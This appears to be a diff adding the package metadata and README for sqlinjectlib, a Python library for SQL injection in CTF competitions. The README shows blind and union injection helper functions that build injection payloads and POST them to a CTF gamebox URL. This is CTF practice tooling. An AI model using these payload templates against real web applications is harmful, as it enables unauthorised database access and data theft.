@@ -1,0 +1,74 @@
+Metadata-Version: 2.1
+Name: sqlinjectlib
+Version: 0.1.1
+Summary: A library to simplify SQL injections during CTFs
+Home-page: https://github.com/rikyiso01/sqlinjectlib
+Keywords: sqlinjection
+Author: rikyiso01
+Author-email: riky.isola@gmail.com
+Requires-Python: >=3.10,<4.0
+Classifier: Development Status :: 4 - Beta
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Operating System :: POSIX :: Linux
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Topic :: Database
+Classifier: Topic :: Utilities
+Classifier: Typing :: Typed
+Requires-Dist: typing-extensions (>=4.4.0,<5.0.0)
+Project-URL: Bug Tracker, https://github.com/rikyiso01/sqlinjectlib/issues
+Project-URL: Documentation, https://rikyiso01.github.io/sqlinjectlib
+Project-URL: Repository, https://github.com/rikyiso01/sqlinjectlib
+Description-Content-Type: text/markdown
+
+# SQLInjectLib
+
+## Introduction
+
+> A library to simplify SQL injections during CTFs
+
+## Code samples
+
+> Extracted from a CTF, some parts were omitted
+>
+> ### Blind Injection
+>
+> ```python
+> def blind_injection(q: SQL[bool]) -> bool:
+>    query = f"animals1' and ({q})--"
+>    final_query = replace_all(query)
+>    c = post(
+>        "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",
+>        data={"query": final_query},
+>    )
+>    return "ANIMALS1" in c.text
+> ```
+>
+> ### Union Injection
+>
+> ```python
+> def union_injection(q: SQL[str]) -> str | None:
+>   query = f"hdjhfjdf' union select 'aa','aa;aa',{q},1--"
+>   final_query = replace_all(query)
+>   c = post(
+>       "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",
+>       data={"query": final_query},
+>   )
+>   m = TAG_FINDER.search(c.text)
+>   result = m.group(1)
+>   return result
+> ```
+
+## Installation
+
+> Install locally with:
+>
+> ```bash
+> python3 -m pip install sqlinjectlib
+> ```
+
